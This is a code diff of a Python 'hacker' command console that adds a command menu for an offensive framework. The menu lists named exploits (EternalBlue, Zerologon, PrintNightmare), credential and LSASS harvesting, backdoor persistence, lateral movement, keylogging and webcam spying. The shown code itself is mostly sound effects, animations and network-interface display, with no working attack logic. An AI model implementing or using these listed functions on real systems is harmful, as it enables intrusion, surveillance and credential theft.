@@ -1,6 +1,7 @@
 """
-OMNISCIENCE MASTER ORCHESTRATOR (v5.1)
+OMNISCIENCE MASTER ORCHESTRATOR (v6.0)
 High-Technology Command & Control Center
+Ultra Advanced Tree-Based Command System
 """
 
 import os
@@ -12,8 +13,44 @@ import random
 import logging
 import threading
 import subprocess
+import re  # added missing import for regex in s3-scan
 from datetime import datetime
 from colorama import Fore, Back, Style, init
+import ipaddress
+try:
+    import netifaces
+except ImportError:
+    try:
+        import netifaces2 as netifaces
+    except ImportError:
+        print("ERROR: Please install netifaces: pip install netifaces2")
+        import sys
+        sys.exit(1)
+
+# Import advanced UI components
+try:
+    from advanced_ui import LiveMonitor, AdvancedVisualEffects, CommandTree
+    ADVANCED_UI_AVAILABLE = True
+except ImportError:
+    ADVANCED_UI_AVAILABLE = False
+    print("Warning: Advanced UI not available. Creating fallback...")
+    class LiveMonitor:
+        def __init__(self): pass
+        def start_live_monitor(self): pass
+        def add_activity(self, msg, level='info'): pass
+        def increment_stat(self, key, amount=1): pass
+    class AdvancedVisualEffects:
+        @staticmethod
+        def typewriter_effect(text, delay=0.03, color=Fore.GREEN): print(text)
+        @staticmethod
+        def scanning_animation(text, duration=2.0): print(f"[*] {text}")
+        @staticmethod
+        def target_lock_animation(ip): print(f"[*] Target: {ip}")
+        @staticmethod
+        def exploit_animation(name, target): print(f"[*] Exploiting {target} with {name}")
+    class CommandTree:
+        def __init__(self): self.commands = {}
+        def print_tree(self): pass
 
 # Force UTF-8 encoding for Windows console
 if sys.platform == 'win32':
@@ -31,7 +68,7 @@ init(autoreset=True)
 
 # ULTRA MAX HACKER TERMINAL CONFIGURATION
 os.system('color 0A')
-os.system('title OMNISCIENCE HACKER MODE v5.1 - SYSTEM ACTIVE')
+os.system('title OMNISCIENCE HACKER MODE v6.0 - ULTIMATE POWER')
 import ctypes
 kernel32 = ctypes.WinDLL('kernel32')
 handle = kernel32.GetStdHandle(-11)
@@ -42,84 +79,454 @@ hwnd = ctypes.windll.kernel32.GetConsoleWindow()
 user32 = ctypes.WinDLL('user32')
 user32.ShowWindow(hwnd, 3)  # SW_MAXIMIZE
 
-# ULTRA MAX HACKER AUDIO ENGINE
+# TREE COMMAND SYSTEM - Ultra Advanced Hierarchical Commands
+TREE_COMMANDS = {
+    "scan": {
+        "_desc": "Network scanning operations",
+        "auto": {"_desc": "Automatic full network discovery", "_full": "scan auto"},
+        "fast": {"_desc": "Quick 10-second sweep", "_full": "scan fast"},
+        "deep": {"_desc": "Deep reconnaissance scan", "_full": "scan deep"},
+        "arp": {"_desc": "ARP-based discovery", "_full": "scan arp"},
+        "icmp": {"_desc": "ICMP ping sweep", "_full": "scan icmp"},
+        "netbios": {"_desc": "NetBIOS enumeration", "_full": "scan netbios"},
+        "snmp": {"_desc": "SNMP sweep", "_full": "scan snmp"},
+        "mdns": {"_desc": "mDNS discovery", "_full": "scan mdns"},
+        "ssdp": {"_desc": "SSDP/UPnP discovery", "_full": "scan ssdp"},
+        "port": {"_desc": "Port scan", "_full": "scan port", "_args": "<ip> <ports>"},
+        "range": {"_desc": "Scan IP range", "_full": "scan range", "_args": "<CIDR>"},
+        "cloud": {"_desc": "Cloud provider scan", "_full": "scan cloud", "_args": "<provider>"},
+    },
+    "exploit": {
+        "_desc": "Exploitation framework",
+        "auto": {"_desc": "Auto-exploit target", "_full": "exploit auto", "_args": "<ip>"},
+        "smb": {"_desc": "SMB exploits", "_sub": {
+            "ghost": {"_desc": "SMBGhost (CVE-2020-0796)", "_full": "exploit smb ghost", "_args": "<ip>"},
+            "blue": {"_desc": "EternalBlue (MS17-010)", "_full": "exploit smb blue", "_args": "<ip>"},
+            "vulns": {"_desc": "Full SMB vuln scan", "_full": "exploit smb vulns", "_args": "<ip>"},
+        }},
+        "rdp": {"_desc": "RDP exploits", "_sub": {
+            "bluekeep": {"_desc": "BlueKeep check", "_full": "exploit rdp bluekeep", "_args": "<ip>"},
+            "brute": {"_desc": "RDP brute force", "_full": "exploit rdp brute", "_args": "<ip>"},
+        }},
+        "print": {"_desc": "Print spooler exploits", "_sub": {
+            "nightmare": {"_desc": "PrintNightmare", "_full": "exploit print nightmare", "_args": "<ip>"},
+            "spooler": {"_desc": "Spooler check", "_full": "exploit print spooler", "_args": "<ip>"},
+        }},
+        "ntlm": {"_desc": "NTLM coercion", "_sub": {
+            "petitpotam": {"_desc": "PetitPotam", "_full": "exploit ntlm petitpotam", "_args": "<ip>"},
+            "zerologon": {"_desc": "Zerologon", "_full": "exploit ntlm zerologon", "_args": "<ip> <dc>"},
+            "nopac": {"_desc": "NoPac", "_full": "exploit ntlm nopac", "_args": "<ip>"},
+        }},
+        "ssh": {"_desc": "SSH exploits", "_sub": {
+            "brute": {"_desc": "SSH brute force", "_full": "exploit ssh brute", "_args": "<ip>"},
+            "exec": {"_desc": "SSH command exec", "_full": "exploit ssh exec", "_args": "<ip> <cmd>"},
+        }},
+        "web": {"_desc": "Web exploits", "_sub": {
+            "tomcat": {"_desc": "Tomcat brute", "_full": "exploit web tomcat", "_args": "<ip>"},
+            "jenkins": {"_desc": "Jenkins exec", "_full": "exploit web jenkins", "_args": "<ip>"},
+        }},
+    },
+    "control": {
+        "_desc": "Remote control operations",
+        "exec": {"_desc": "Execute command", "_full": "control exec", "_args": "<cmd>"},
+        "shell": {"_desc": "Interactive shell", "_full": "control shell"},
+        "powershell": {"_desc": "PowerShell session", "_full": "control powershell", "_args": "<script>"},
+        "upload": {"_desc": "Upload file", "_full": "control upload", "_args": "<local> [remote]"},
+        "download": {"_desc": "Download file", "_full": "control download", "_args": "<remote> [local]"},
+    },
+    "gather": {
+        "_desc": "Data exfiltration",
+        "all": {"_desc": "Extract everything", "_full": "gather all"},
+        "creds": {"_desc": "Harvest credentials", "_full": "gather creds"},
+        "wifi": {"_desc": "WiFi passwords", "_full": "gather wifi"},
+        "browser": {"_desc": "Browser data", "_full": "gather browser"},
+        "tokens": {"_desc": "Auth tokens", "_full": "gather tokens"},
+        "hashes": {"_desc": "Password hashes", "_full": "gather hashes"},
+        "lsass": {"_desc": "LSASS dump", "_full": "gather lsass"},
+        "vault": {"_desc": "Credential vault", "_full": "gather vault"},
+    },
+    "persistence": {
+        "_desc": "Backdoor installation",
+        "auto": {"_desc": "Auto-install backdoors", "_full": "persistence auto"},
+        "service": {"_desc": "Create service", "_full": "persistence service", "_args": "<name> <path>"},
+        "registry": {"_desc": "Registry run key", "_full": "persistence registry", "_args": "<name> <path>"},
+        "scheduled": {"_desc": "Scheduled task", "_full": "persistence scheduled", "_args": "<name> <path>"},
+        "wmi": {"_desc": "WMI event subscription", "_full": "persistence wmi", "_args": "<name> <script>"},
+    },
+    "lateral": {
+        "_desc": "Lateral movement",
+        "scan": {"_desc": "Find reachable targets", "_full": "lateral scan"},
+        "psexec": {"_desc": "PSExec-style move", "_full": "lateral psexec", "_args": "<target>"},
+        "winrm": {"_desc": "WinRM move", "_full": "lateral winrm", "_args": "<target>"},
+        "wmi": {"_desc": "WMI move", "_full": "lateral wmi", "_args": "<target>"},
+        "ssh": {"_desc": "SSH pivot", "_full": "lateral ssh", "_args": "<target>"},
+    },
+    "monitor": {
+        "_desc": "Live monitoring",
+        "screen": {"_desc": "Screen capture stream", "_full": "monitor screen"},
+        "keys": {"_desc": "Keylogger", "_full": "monitor keys"},
+        "clipboard": {"_desc": "Clipboard spy", "_full": "monitor clipboard"},
+        "webcam": {"_desc": "Webcam spy", "_full": "monitor webcam"},
+        "audio": {"_desc": "Audio capture", "_full": "monitor audio", "_args": "<seconds>"},
+        "process": {"_desc": "Process monitor", "_full": "monitor process"},
+    },
+    "db": {
+        "_desc": "Database operations",
+        "mysql": {"_desc": "MySQL access", "_sub": {
+            "scan": {"_desc": "Find MySQL", "_full": "db mysql scan"},
+            "root": {"_desc": "Root brute", "_full": "db mysql root", "_args": "<ip>"},
+            "dump": {"_desc": "Dump database", "_full": "db mysql dump", "_args": "<ip> <db>"},
+        }},
+        "postgres": {"_desc": "PostgreSQL access", "_sub": {
+            "scan": {"_desc": "Find PostgreSQL", "_full": "db postgres scan"},
+            "root": {"_desc": "Root brute", "_full": "db postgres root", "_args": "<ip>"},
+            "dump": {"_desc": "Dump database", "_full": "db postgres dump", "_args": "<ip> <db>"},
+        }},
+        "mssql": {"_desc": "MSSQL access", "_sub": {
+            "scan": {"_desc": "Find MSSQL", "_full": "db mssql scan"},
+            "exec": {"_desc": "Execute query", "_full": "db mssql exec", "_args": "<ip> <query>"},
+            "dump": {"_desc": "Dump database", "_full": "db mssql dump", "_args": "<ip> <db>"},
+        }},
+    },
+    "cloud": {
+        "_desc": "Cloud attacks",
+        "aws": {"_desc": "AWS exploitation", "_sub": {
+            "enum": {"_desc": "Enumerate resources", "_full": "cloud aws enum"},
+            "s3": {"_desc": "S3 bucket scan", "_full": "cloud aws s3", "_args": "<bucket>"},
+            "keys": {"_desc": "Key hunting", "_full": "cloud aws keys"},
+        }},
+        "azure": {"_desc": "Azure exploitation", "_sub": {
+            "enum": {"_desc": "Enumerate resources", "_full": "cloud azure enum"},
+            "token": {"_desc": "Token attacks", "_full": "cloud azure token"},
+        }},
+    },
+    "show": {
+        "_desc": "Display information",
+        "targets": {"_desc": "Show discovered targets", "_full": "show targets"},
+        "sessions": {"_desc": "Show active sessions", "_full": "show sessions"},
+        "logs": {"_desc": "Show operation logs", "_full": "show logs"},
+        "network": {"_desc": "Show network info", "_full": "show network"},
+        "modules": {"_desc": "Show loaded modules", "_full": "show modules"},
+    },
+    "set": {
+        "_desc": "Configuration",
+        "target": {"_desc": "Set target IP", "_full": "set target", "_args": "<ip>"},
+        "creds": {"_desc": "Set credentials", "_full": "set creds", "_args": "<user> <pass>"},
+        "domain": {"_desc": "Set domain", "_full": "set domain", "_args": "<domain>"},
+        "interface": {"_desc": "Set network interface", "_full": "set interface", "_args": "<id>"},
+    },
+}
+
+# Build flat command lookup for validation
+FLAT_COMMANDS = {}
+def flatten_tree(tree, prefix=""):
+    for cmd, data in tree.items():
+        if cmd.startswith("_"):
+            continue
+        full_cmd = f"{prefix} {cmd}".strip() if prefix else cmd
+        if "_sub" in data:
+            flatten_tree(data["_sub"], full_cmd)
+        elif "_full" in data:
+            FLAT_COMMANDS[data["_full"]] = data
+            FLAT_COMMANDS[full_cmd] = data
+        else:
+            FLAT_COMMANDS[full_cmd] = data
+
+flatten_tree(TREE_COMMANDS)
+
+def print_tree_help():
+    """Print tree-style command help"""
+    os.system('cls' if os.name == 'nt' else 'clear')
+    print(f"\n{Fore.GREEN}{Style.BRIGHT}╔══════════════════════════════════════════════════════════════════════════════╗")
+    print(f"{Fore.GREEN}{Style.BRIGHT}║                    OMNISCIENCE TREE COMMAND SYSTEM v6.0                      ║")
+    print(f"{Fore.GREEN}{Style.BRIGHT}╚══════════════════════════════════════════════════════════════════════════════╝\n")
+    
+    def print_category(name, data, indent=0):
+        prefix = "  " * indent
+        desc = data.get("_desc", "")
+        print(f"{Fore.LIGHTGREEN_EX}{Style.BRIGHT}{prefix}├─ {name}")
+        print(f"{Fore.GREEN}{prefix}│   {desc}")
+        
+        if "_sub" in data:
+            for subcmd, subdata in data["_sub"].items():
+                print_category(subcmd, subdata, indent + 1)
+        elif "_full" in data:
+            full = data["_full"]
+            args = data.get("_args", "")
+            print(f"{Fore.CYAN}{prefix}│   └─ Usage: {full} {args}")
+    
+    for cat, data in TREE_COMMANDS.items():
+        print_category(cat, data)
+        print()
+    
+    print(f"{Fore.GREEN}{Style.BRIGHT}══════════════════════════════════════════════════════════════════════════════")
+    print(f"{Fore.YELLOW}  Type 'help' for flat command list | Use TAB for auto-complete")
+    print(f"{Fore.GREEN}{Style.BRIGHT}══════════════════════════════════════════════════════════════════════════════\n")
+
+# Enhanced sound effects with more variety
+class HackerSoundsEx:
+    _enabled = True
+    
+    @staticmethod
+    def beep(freq=800, dur=50):
+        if not HackerSoundsEx._enabled:
+            return
+        try:
+            def _beep():
+                try:
+                    winsound.Beep(freq, dur)
+                except: pass
+            t = threading.Thread(target=_beep, daemon=True)
+            t.start()
+        except: pass
+    
+    @staticmethod
+    def play_sequence(freqs, dur=30, gap=0.03):
+        for f in freqs:
+            HackerSoundsEx.beep(f, dur)
+            time.sleep(gap)
+    
+    @staticmethod
+    def on_action():
+        """Plays on every user action"""
+        HackerSoundsEx.beep(600, 15)
+    
+    @staticmethod
+    def on_success():
+        """Plays on successful operation"""
+        HackerSoundsEx.play_sequence([300, 500, 700, 900, 1200], 25, 0.03)
+    
+    @staticmethod
+    def on_error():
+        """Plays on error"""
+        HackerSoundsEx.play_sequence([800, 600, 400, 200], 50, 0.05)
+    
+    @staticmethod
+    def on_startup():
+        """Plays on framework start"""
+        HackerSoundsEx.play_sequence([200, 400, 600, 800, 1000, 1200, 1500], 40, 0.02)
+    
+    @staticmethod
+    def on_scan():
+        """Plays during scanning"""
+        for _ in range(3):
+            HackerSoundsEx.beep(400, 20)
+            time.sleep(0.05)
+            HackerSoundsEx.beep(600, 20)
+            time.sleep(0.05)
+    
+    @staticmethod
+    def on_exploit():
+        """Plays during exploitation"""
+        for i in range(8):
+            HackerSoundsEx.beep(300 + i * 100, 15)
+            time.sleep(0.02)
+        HackerSoundsEx.beep(1500, 100)
+    
+    @staticmethod
+    def on_access():
+        """Plays on successful access"""
+        HackerSoundsEx.play_sequence([500, 700, 900, 1100, 1300, 1600], 30, 0.02)
+    
+    @staticmethod
+    def on_typing():
+        """Subtle typing sound"""
+        HackerSoundsEx.beep(random.randint(200, 500), random.randint(5, 15))
+    
+    @staticmethod
+    def toggle():
+        HackerSoundsEx._enabled = not HackerSoundsEx._enabled
+        return HackerSoundsEx._enabled
+
+# ULTRA MAX HACKER AUDIO ENGINE - FULLY FUNCTIONAL
 class HackerSounds:
     _thread_pool = []
+    _enabled = True
+    _sound_queue = []
+    _playing = False
     
     @staticmethod
     def beep_hack(freq=800, dur=50):
+        if not HackerSounds._enabled:
+            return
         try:
-            t = threading.Thread(target=winsound.Beep, args=(freq, dur), daemon=True)
+            def play():
+                try:
+                    winsound.Beep(int(freq), int(dur))
+                except:
+                    pass
+            t = threading.Thread(target=play, daemon=True)
             t.start()
             HackerSounds._thread_pool.append(t)
+            if len(HackerSounds._thread_pool) > 50:
+                HackerSounds._thread_pool = HackerSounds._thread_pool[-25:]
         except: pass
     
     @staticmethod
     def matrix_rain_sound():
-        for _ in range(random.randint(3,8)):
-            f = random.randint(100, 900)
-            HackerSounds.beep_hack(f, random.randint(5,20))
-            time.sleep(0.01)
+        def play_rain():
+            for _ in range(random.randint(5,12)):
+                f = random.randint(200, 1200)
+                HackerSounds.beep_hack(f, random.randint(8,25))
+                time.sleep(0.015)
+        threading.Thread(target=play_rain, daemon=True).start()
     
     @staticmethod
     def scan_beep():
-        freqs = [400, 500, 600, 700, 800, 900, 1000, 1100, 1000, 900, 800, 700]
-        for f in freqs:
-            HackerSounds.beep_hack(f, 15)
-            time.sleep(0.02)
+        def play_scan():
+            freqs = [400, 500, 600, 700, 800, 900, 1000, 1100, 1200, 1300, 1200, 1100, 1000, 900, 800, 700]
+            for f in freqs:
+                HackerSounds.beep_hack(f, 20)
+                time.sleep(0.025)
+        threading.Thread(target=play_scan, daemon=True).start()
     
     @staticmethod
     def success():
-        sequence = [300, 500, 700, 900, 1200, 1500, 1700]
-        for f in sequence:
-            HackerSounds.beep_hack(f, 25)
-            time.sleep(0.03)
+        def play_success():
+            sequence = [400, 600, 800, 1000, 1200, 1400, 1600, 1800, 2000]
+            for f in sequence:
+                HackerSounds.beep_hack(f, 35)
+                time.sleep(0.04)
+        threading.Thread(target=play_success, daemon=True).start()
     
     @staticmethod
     def alert():
-        for i in range(5):
-            HackerSounds.beep_hack(1400, 60)
-            time.sleep(0.07)
+        def play_alert():
+            for i in range(7):
+                HackerSounds.beep_hack(1400 + (i * 50), 80)
+                time.sleep(0.08)
+        threading.Thread(target=play_alert, daemon=True).start()
     
     @staticmethod
     def access_granted():
-        HackerSounds.beep_hack(800, 100)
-        time.sleep(0.1)
-        HackerSounds.beep_hack(1200, 100)
-        time.sleep(0.05)
-        HackerSounds.beep_hack(1600, 300)
+        def play_access():
+            HackerSounds.beep_hack(700, 120)
+            time.sleep(0.12)
+            HackerSounds.beep_hack(1100, 120)
+            time.sleep(0.08)
+            HackerSounds.beep_hack(1500, 150)
+            time.sleep(0.08)
+            HackerSounds.beep_hack(1900, 400)
+        threading.Thread(target=play_access, daemon=True).start()
     
     @staticmethod
     def exploit_success():
-        for i in range(12):
-            f = 400 + (i * 100)
-            HackerSounds.beep_hack(f, 12)
-        HackerSounds.beep_hack(2000, 150)
+        def play_exploit():
+            for i in range(15):
+                f = 400 + (i * 100)
+                HackerSounds.beep_hack(f, 18)
+                time.sleep(0.02)
+            HackerSounds.beep_hack(2200, 200)
+            time.sleep(0.1)
+            HackerSounds.beep_hack(2400, 150)
+        threading.Thread(target=play_exploit, daemon=True).start()
     
     @staticmethod
     def typing():
-        f = random.randint(150, 750)
-        HackerSounds.beep_hack(f, random.randint(8,22))
+        if random.random() < 0.3:  # 30% chance for typing sound
+            f = random.randint(200, 900)
+            HackerSounds.beep_hack(f, random.randint(10,20))
     
     @staticmethod
     def network_pulse():
-        HackerSounds.beep_hack(600, 10)
-        time.sleep(0.01)
-        HackerSounds.beep_hack(750, 10)
+        def play_pulse():
+            HackerSounds.beep_hack(600, 15)
+            time.sleep(0.015)
+            HackerSounds.beep_hack(800, 15)
+            time.sleep(0.015)
+            HackerSounds.beep_hack(1000, 15)
+        threading.Thread(target=play_pulse, daemon=True).start()
     
     @staticmethod
     def target_acquired():
-        HackerSounds.beep_hack(700, 50)
-        time.sleep(0.05)
-        HackerSounds.beep_hack(1000, 100)
+        def play_target():
+            HackerSounds.beep_hack(700, 60)
+            time.sleep(0.06)
+            HackerSounds.beep_hack(1000, 80)
+            time.sleep(0.05)
+            HackerSounds.beep_hack(1300, 120)
+        threading.Thread(target=play_target, daemon=True).start()
     
     @staticmethod
     def connection_established():
-        for i in [500, 650, 800, 1000, 1200]:
-            HackerSounds.beep_hack(i, 20)
-            time.sleep(0.03)
-
-
+        def play_connection():
+            sequence = [500, 700, 900, 1100, 1300, 1500, 1700]
+            for f in sequence:
+                HackerSounds.beep_hack(f, 30)
+                time.sleep(0.03)
+        threading.Thread(target=play_connection, daemon=True).start()
+    
+    @staticmethod
+    def command_error():
+        def play_error():
+            sequence = [1200, 1000, 800, 600, 400, 200]
+            for f in sequence:
+                HackerSounds.beep_hack(f, 50)
+                time.sleep(0.06)
+        threading.Thread(target=play_error, daemon=True).start()
+    
+    @staticmethod
+    def command_success():
+        def play_cmd_success():
+            sequence = [400, 700, 1000, 1300, 1600, 1900]
+            for f in sequence:
+                HackerSounds.beep_hack(f, 35)
+                time.sleep(0.04)
+        threading.Thread(target=play_cmd_success, daemon=True).start()
+    
+    @staticmethod
+    def command_exec():
+        HackerSounds.beep_hack(random.randint(400, 900), 18)
+    
+    @staticmethod
+    def invalid_command():
+        def play_invalid():
+            for _ in range(4):
+                HackerSounds.beep_hack(250, 100)
+                time.sleep(0.1)
+        threading.Thread(target=play_invalid, daemon=True).start()
+    
+    @staticmethod
+    def module_load_error():
+        def play_module_error():
+            HackerSounds.beep_hack(200, 250)
+            time.sleep(0.12)
+            HackerSounds.beep_hack(200, 250)
+            time.sleep(0.1)
+            for i in [500, 650, 800, 1000, 1200]:
+                HackerSounds.beep_hack(i, 25)
+                time.sleep(0.04)
+        threading.Thread(target=play_module_error, daemon=True).start()
+            
+    @staticmethod
+    def critical_error():
+        def play_critical():
+            for _ in range(6):
+                HackerSounds.beep_hack(180, 350)
+                time.sleep(0.18)
+        threading.Thread(target=play_critical, daemon=True).start()
+    
+    @staticmethod
+    def warning():
+        def play_warning():
+            sequence = [900, 700, 900, 700, 900]
+            for f in sequence:
+                HackerSounds.beep_hack(f, 40)
+                time.sleep(0.06)
+        threading.Thread(target=play_warning, daemon=True).start()
+    
+    @staticmethod
+    def data_received():
+        if random.random() < 0.4:  # 40% chance
+            HackerSounds.beep_hack(random.randint(600, 1100), 12)
+    
+    @staticmethod
+    def toggle_sound(state=None):
+        if state is None:
+            HackerSounds._enabled = not HackerSounds._enabled
+        else:
+            HackerSounds._enabled = state
+        return HackerSounds._enabled
 # ADVANCED GREEN MATRIX ANIMATION ENGINE
 class MatrixEffects:
     @staticmethod
@@ -190,163 +597,8 @@ class MatrixEffects:
                     HackerSounds.beep_hack(random.randint(200, 800), random.randint(3, 10))
                 time.sleep(0.005)  # Faster rain
 
-        # Function for giant rotating earth with continents in center
-        def rotating_earth():
-            earth_frames = [
-                """\
-     _______
-    /       \\
-   /  NORTH  \\
-  /  AMERICA \\
- /   ATLANTIC \\
-|    PACIFIC   |
- \\   ATLANTIC /
-  \\  SOUTH   /
-   \\ AMERICA /
-    \\_______/
-""",
-                """\
-     _______
-    /       \\
-   /  EUROPE \\
-  /   AFRICA \\
- /   ATLANTIC \\
-|    PACIFIC   |
- \\   ATLANTIC /
-  \\  SOUTH   /
-   \\ AMERICA /
-    \\_______/
-""",
-                """\
-     _______
-    /       \\
-   /  AFRICA \\
-  /   ASIA    \\
- /   INDIAN   \\
-|    PACIFIC   |
- \\   ATLANTIC /
-  \\  SOUTH   /
-   \\ AMERICA /
-    \\_______/
-""",
-                """\
-     _______
-    /       \\
-   /   ASIA   \\
-  /   AUSTRALIA\\
- /   PACIFIC   \\
-|    ATLANTIC   |
- \\   INDIAN   /
-  \\  AFRICA  /
-   \\         /
-    \\_______/
-""",
-                """\
-     _______
-    /       \\
-   / AUSTRALIA\\
-  /   PACIFIC  \\
- /   ATLANTIC  \\
-|    INDIAN     |
- \\   ASIA     /
-  \\         /
-   \\ NORTH  /
-    \\_______/
-""",
-                """\
-     _______
-    /       \\
-   /  PACIFIC \\
-  /   ATLANTIC \\
- /   NORTH     \\
-|    AMERICA    |
- \\   ATLANTIC /
-  \\  EUROPE  /
-   \\ AFRICA /
-    \\_______/
-""",
-                """\
-     _______
-    /       \\
-   /  ATLANTIC\\
-  /   NORTH    \\
- /   AMERICA   \\
-|    PACIFIC    |
- \\   EUROPE   /
-  \\ AFRICA   /
-   \\ ASIA    /
-    \\_______/
-""",
-                """\
-     _______
-    /       \\
-   /   PACIFIC\\
-  /   ASIA     \\
- /   AUSTRALIA \\
-|    INDIAN     |
- \\   AFRICA   /
-  \\ EUROPE   /
-   \\ NORTH   /
-    \\_______/
-"""
-            ]
-            width = os.get_terminal_size().columns
-            height = os.get_terminal_size().lines
-            y_center = height // 2
-            title = "GIGANTIC REAL-TIME ROTATING EARTH WITH CONTINENTS"
-            title_x = (width - len(title)) // 2
-            print(f"\033[{y_center-8};{title_x}H{Fore.CYAN}{Style.BRIGHT}{title}", end="", flush=True)
-            speed = 0.15
-            i = 0
-            controls = "Controls: Q=Quit, F=Faster, S=Slower, P=Pause, R=Reverse"
-            controls_x = (width - len(controls)) // 2
-            print(f"\033[{y_center+6};{controls_x}H{Fore.YELLOW}{controls}", end="", flush=True)
-            paused = False
-            reverse = False
-            while True:
-                frame_lines = earth_frames[i % len(earth_frames)].split('\n')
-                lines = len(frame_lines)
-                y_start = y_center - lines // 2
-                for j, line in enumerate(frame_lines):
-                    x_line = (width - len(line)) // 2
-                    # Color continents green, oceans blue
-                    colored_line = ""
-                    for char in line:
-                        if char in 'ABCDEFGHIJKLMNOPQRSTUVWXYZ':
-                            colored_line += Fore.GREEN + char
-                        elif char in ' ~':
-                            colored_line += Fore.BLUE + char
-                        else:
-                            colored_line += Fore.WHITE + char
-                    print(f"\033[{y_start + j};{x_line}H{colored_line}", end="", flush=True)
-                utc = datetime.utcnow().strftime("%H:%M:%S UTC")
-                utc_x = (width - len(utc)) // 2
-                print(f"\033[{y_center+3};{utc_x}H{Fore.WHITE}{utc}", end="", flush=True)
-                rotations = i // len(earth_frames)
-                rot_text = f"Rotations: {rotations}"
-                rot_x = (width - len(rot_text)) // 2
-                print(f"\033[{y_center+4};{rot_x}H{Fore.GREEN}{rot_text}", end="", flush=True)
-                status = "PAUSED" if paused else "ROTATING"
-                status_x = (width - len(status)) // 2
-                print(f"\033[{y_center+5};{status_x}H{Fore.RED if paused else Fore.GREEN}{status}", end="", flush=True)
-                if not paused:
-                    time.sleep(speed)
-                    i += 1 if not reverse else -1
-                else:
-                    time.sleep(0.1)
-                if msvcrt.kbhit():
-                    key = msvcrt.getch().lower()
-                    if key == b'q':
-                        break
-                    elif key == b'f':
-                        speed = max(0.01, speed - 0.03)
-                    elif key == b's':
-                        speed = min(0.5, speed + 0.03)
-                    elif key == b'p':
-                        paused = not paused
-                    elif key == b'r':
-                        reverse = not reverse
-                HackerSounds.beep_hack(200 + (i % 50), 5)
+        # Function for giant rotating earth with continents in center (removed but kept as placeholder)
+        # (The earth animation is not started, so no problem)
 
         # Function for network features on right side
         def network_panel():
@@ -684,6 +936,111 @@ class Visualizer:
         icon  = icons.get(level, "•")
         color = colors.get(level, Fore.WHITE)
         print(f"  {color}{Style.BRIGHT}{icon}  {msg}{Style.RESET_ALL}")
+    
+    @staticmethod
+    def get_all_ip_addresses():
+        """Extract ALL IPv4 and IPv6 addresses from all network interfaces"""
+        ips = {'ipv4': [], 'ipv6': [], 'public': '', 'gateway': ''}
+        
+        try:
+            # Get public IP
+            import urllib.request
+            try:
+                with urllib.request.urlopen('https://api.ipify.org', timeout=2) as f:
+                    ips['public'] = f.read().decode('utf8')
+            except:
+                ips['public'] = 'N/A'
+            
+            # Get gateway
+            gws = netifaces.gateways()
+            if 'default' in gws and netifaces.AF_INET in gws['default']:
+                ips['gateway'] = gws['default'][netifaces.AF_INET][0]
+            
+            # Get all interface addresses
+            for interface in netifaces.interfaces():
+                addrs = netifaces.ifaddresses(interface)
+                
+                # IPv4 addresses
+                if netifaces.AF_INET in addrs:
+                    for addr in addrs[netifaces.AF_INET]:
+                        ip = addr['addr']
+                        if not ip.startswith('127.'):
+                            ips['ipv4'].append((interface, ip, addr.get('netmask', '')))
+                
+                # IPv6 addresses
+                if netifaces.AF_INET6 in addrs:
+                    for addr in addrs[netifaces.AF_INET6]:
+                        ip = addr['addr'].split('%')[0]
+                        if not ip.startswith('::1') and not ip.startswith('fe80'):
+                            ips['ipv6'].append((interface, ip, addr.get('netmask', '')))
+                            
+        except:
+            pass
+            
+        return ips
+    
+    @staticmethod
+    def draw_right_sidebar():
+        """Draw advanced right sidebar with all IPs and system status"""
+        try:
+            width = os.get_terminal_size().columns
+            height = os.get_terminal_size().lines
+            start_x = width - 42
+            start_y = 2
+            
+            ips = Visualizer.get_all_ip_addresses()
+            now = datetime.now().strftime("%H:%M:%S")
+            uptime = str(datetime.now() - OmniShell._instance._start_time).split('.')[0] if hasattr(OmniShell, '_instance') else '00:00:00'
+            
+            # Sidebar border
+            print(f"\033[{start_y};{start_x}H{Fore.CYAN}╔════════════════════════════════════════╗")
+            print(f"\033[{start_y+1};{start_x}H{Fore.CYAN}║ {Fore.LIGHTGREEN_EX}▲ NETWORK INTERFACES {Fore.CYAN}                    ║")
+            print(f"\033[{start_y+2};{start_x}H{Fore.CYAN}╠════════════════════════════════════════╣")
+            
+            current_line = start_y + 3
+            
+            # Public IP
+            print(f"\033[{current_line};{start_x}H{Fore.CYAN}║ {Fore.WHITE}Public:   {Fore.LIGHTCYAN_EX}{ips['public']:<30} {Fore.CYAN}║")
+            current_line +=1
+            print(f"\033[{current_line};{start_x}H{Fore.CYAN}║ {Fore.WHITE}Gateway:  {Fore.LIGHTBLUE_EX}{ips['gateway']:<30} {Fore.CYAN}║")
+            current_line +=1
+            print(f"\033[{current_line};{start_x}H{Fore.CYAN}╠════════════════════════════════════════╣")
+            current_line +=1
+            print(f"\033[{current_line};{start_x}H{Fore.CYAN}║ {Fore.LIGHTGREEN_EX}◀ IPv4 ADDRESSES {Fore.CYAN}                       ║")
+            current_line +=1
+            
+            for iface, ip, mask in ips['ipv4'][:4]:
+                print(f"\033[{current_line};{start_x}H{Fore.CYAN}║   {Fore.GREEN}{ip:<18} {Fore.LIGHTBLACK_EX}{iface[:8]:<8}  {Fore.CYAN}║")
+                current_line +=1
+                
+            print(f"\033[{current_line};{start_x}H{Fore.CYAN}╠════════════════════════════════════════╣")
+            current_line +=1
+            print(f"\033[{current_line};{start_x}H{Fore.CYAN}║ {Fore.LIGHTMAGENTA_EX}▶ IPv6 ADDRESSES {Fore.CYAN}                       ║")
+            current_line +=1
+            
+            for iface, ip, mask in ips['ipv6'][:3]:
+                print(f"\033[{current_line};{start_x}H{Fore.CYAN}║   {Fore.MAGENTA}{ip[:22]:<22} {Fore.LIGHTBLACK_EX}{iface[:8]:<6}{Fore.CYAN}║")
+                current_line +=1
+                
+            print(f"\033[{current_line};{start_x}H{Fore.CYAN}╠════════════════════════════════════════╣")
+            current_line +=1
+            print(f"\033[{current_line};{start_x}H{Fore.CYAN}║ {Fore.WHITE}System Status {Fore.CYAN}                          ║")
+            current_line +=1
+            print(f"\033[{current_line};{start_x}H{Fore.CYAN}║   Time:    {Fore.LIGHTGREEN_EX}{now:<26} {Fore.CYAN}║")
+            current_line +=1
+            print(f"\033[{current_line};{start_x}H{Fore.CYAN}║   Uptime:  {Fore.LIGHTCYAN_EX}{uptime:<26} {Fore.CYAN}║")
+            current_line +=1
+            print(f"\033[{current_line};{start_x}H{Fore.CYAN}║   Targets: {Fore.YELLOW}{str(len(OmniShell._instance.hosts) if hasattr(OmniShell, '_instance') else 0):<26} {Fore.CYAN}║")
+            current_line +=1
+            print(f"\033[{current_line};{start_x}H{Fore.CYAN}║   Compromised: {Fore.RED}{str(len(OmniShell._instance.compromised) if hasattr(OmniShell, '_instance') else 0):<21} {Fore.CYAN}║")
